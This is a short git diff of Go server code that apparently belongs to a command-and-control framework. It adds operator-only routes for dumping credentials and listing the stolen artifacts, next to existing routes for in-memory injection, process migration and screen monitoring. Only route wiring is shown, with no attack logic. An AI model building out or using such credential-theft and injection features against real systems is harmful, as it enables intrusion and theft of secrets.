@@ -779,6 +779,10 @@ func main() {
 	// 内存注入（纯内存通道，不落盘；替代原文件路径注入）
 	operatorOnly.POST("/client/inject-mem", api.InjectMem)
 	// 进程迁移（重上线式：重建同配置 beacon→donut→注入目标进程→原进程退出）
+	// 凭据获取（阶段三）：制品的登记与校验在 pkg/cred，回传复用下载通道
+	operatorOnly.POST("/cred/dump", api.DumpCredential)
+	operatorOnly.GET("/cred/artifacts", api.ListCredArtifacts)
+
 	operatorOnly.POST("/client/migrate", api.Migrate)
 
 	// 屏幕监控功能（【RBAC修复】监控/截图属敏感操作，仅 admin+operator）
